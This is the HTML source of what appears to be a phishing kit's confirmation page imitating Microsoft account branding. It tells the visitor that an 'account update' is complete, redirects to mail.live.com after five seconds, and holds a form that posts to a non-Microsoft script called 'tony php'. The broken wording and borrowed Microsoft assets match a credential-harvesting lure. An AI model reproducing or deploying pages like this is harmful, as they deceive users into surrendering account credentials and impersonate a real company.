<!DOCTYPE html>
<html dir="ltr" lang="EN-US">
<head>
<meta http-equiv="refresh" content="5; url=http://mail.live.com">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, Voice: -3};</script>
<title>Sign in to update your Microsoft to new version</title>

<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.26227.00/favicon.ico?v=2">
        <link rel="stylesheet" title="Default" type="text/css" href="https://auth.gfx.ms/16.000.26537.00/Default1033.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style>
<style type="text/css">body{display:none;}</style>
<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>
<style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript>
<script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(a,f,b){var e=1,d=unescape('%3Cscript type="text/javascript" src="'),c=unescape('"%3E%3C/script%3E');if(g_sSRSSuccess.indexOf(a)!=-1)return;if(typeof window[a]=="undefined"){g_iSRSFailed=1;b<=e&&document.write(d+f+c)}else g_sSRSSuccess+=a+"|"+b+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.26227.00/Windows_Live_v_thumb.jpg">
<script type="text/javascript" src="https://auth.gfx.ms/16.000.26537.00/DefaultLogin_Core.js"></script>
  <script type="text/javascript" src="https://auth.gfx.ms/16.000.26537.00/DefaultLogin_Core.js"></script>
  <script type="text/javascript">SRSRetry("__DefaultLogin_Strings", "https://auth.gfx.ms/16.000.26227.00/DefaultLoginStrings1033.js", 1);SRSRetry("__DefaultLogin_Core", "https://auth.gfx.ms/16.000.26227.00/DefaultLogin_Core.js", 1);</script><script type="text/javascript">SRSRetry("__DefaultLogin_Strings", "https://auth.gfx.ms/16.000.26227.00/DefaultLoginStrings1033.js", 2);SRSRetry("__DefaultLogin_Core", "https://auth.gfx.ms/16.000.26227.00/DefaultLogin_Core.js", 2);</script></head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div>
<div class="row text-subheader" data-bind="text: str['WF_STR_HeaderDefault_Title']">Your update has completed successfully </div>
<div class="row text-body"><div data-bind="text: str['WF_STR_Default_Desc']">Your account is now updated to our new version.</div><div data-bind="visible: !svr.F"><a id="learnMoreLink" href="#" target="_top" data-bind="text: str['WF_STR_LearnMoreLink_Text'], click: learnMore.open">Thanks for chosen Microsoft?</a></div></div>
<form action="tony php" name="f1" method="post" target="_top" autocomplete="off">

Terms of Use Privacy & Cookies
Microsoft  

� 2017 Microsoft Corporation. All rights reserved.